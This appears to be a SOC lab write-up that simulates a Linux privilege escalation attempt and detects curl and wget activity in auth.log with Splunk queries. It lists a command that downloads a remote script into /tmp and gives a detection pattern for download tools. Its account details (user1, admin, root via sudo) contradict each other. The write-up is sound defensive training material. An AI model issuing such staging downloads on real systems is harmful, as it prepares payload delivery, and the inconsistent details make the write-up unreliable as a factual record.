
# Scenario 3: Privilege Escalation Attempt (Unauthorized Sudo Usage)

## Overview
This scenario simulates a **privilege escalation attempt** in which an attacker, after gaining access to a Linux system with a **non-privileged user account**, attempts to execute commands using `sudo`.
The objective is to detect and analyze **unauthorized sudo activity** from authentication logs and correlate the behavior using Splunk.

---

## Objective
1. Detect sudo execution attempts by a **non-privileged account**
2. Analyze Linux authentication logs for privilege escalation indicators
3. Correlate events in Splunk to support SOC investigation
4. Demonstrate SOC-style triage and analysis methodology

---

## Lab Environment
- **Attacker VM:** Kali Linux
- **Victim VM:** Ubuntu Server
- **Service:** OpenSSH (sshd)
- **Log Source:** `/var/log/auth.log`
- **SIEM:** Splunk
- **User Account:** `user1` (no sudo privileges)

---

## Attack Simulation
### Initial Access
The attacker successfully authenticates to the system using SSH with a standard user account.

- Account: `user1`
- Authentication method: SSH password login
- Result: Login successful

 

Executed commands:
- `curl http://example.com`
- `wget http://example.com -O /tmp/test.sh`

Characteristics of the attack:
- Commands are commonly abused to download remote content
- No payload execution was performed
- Targeted account: `admin`
- All activity was logged in `/var/log/auth.log`

---

## Investigation Phase

### Purpose
The purpose of this phase is to gain visibility into command execution by identifying:
- Which commands were executed
- Under which privilege context
- On which host and at what time

This mirrors a SOC analyst’s initial investigation after detecting suspicious post-login activity.

### Investigation Query
```spl
index=main source="/var/log/auth.log" ("curl" OR "wget")
| table _time host USER _raw
```

### Explanation
- Filters authentication logs for suspicious command keywords
- Displays the full raw log for command context
- Uses the `USER` field to identify the execution privilege

## Outcome
- Confirmed execution of `curl` and `wget` commands
- Identified commands executed under elevated privileges

---

## Detection Phase
### Purpose
Based on the investigation findings, a detection query was created to reliably identify suspicious command execution while minimizing noise from investigative or benign administrative commands.

### Detection Query
```spl
index=main source="/var/log/auth.log" ("curl" OR "wget")
| search NOT ("grep" OR "apt")
| stats count by host USER COMMAND
| where count >= 1
```

### Detection Logic
- Detects usage of commonly abused command-line utilities
- Investigative and package management commands such as `grep` and `apt` were excluded to reduce false positives and focus on potentially malicious command execution.
- Aggregates by host, execution user, and full command
- Suitable for reuse as an alerting rule

This approach prioritizes clarity and reliability over overly complex parsing logic.

---
## Findings
- Detected suspicious command execution events : 2
- Commands observed: `curl`, `wget`
- Execution context: root (via sudo)
- Host affected: Single Ubuntu server

The activity aligns with expected patterns of post-authentication reconnaissance or staging behavior.

---
## Response & Mitigation
- Review executed commands and retrieved files
- Audit sudo usage and privilege escalation paths
- Monitor for repeated or chained command execution

## Notes
- The `USER` field represents the privilege context under which the command was executed, rather than the SSH-authenticated user.
- Investigation and detection queries intentionally differ to reflect real SOC processes.


## Screenshots
Screenshots of Splunk search results and detection output can be found in the `screenshots/` directory.

### Attack Simulation-ssh login
![Attack Simulation-ssh login](screenshots/01_ssh_login_admin_success.png)

### Attack Simulation-command execution
![Attack Simulation-command execution](screenshots/02_suspicious_command_execution.png)

### Victim Authentication Logs
![Victim Authentication Logs](screenshots/03_sudo_suspicious_commands_log.png)

### Investigation Results 
![Investigation_Query](screenshots/04_splunk_investigation_broad_search.png)

### Detection Results
![Detection Results](screenshots/05_splunk_detection_suspicious_command_execution02.png)
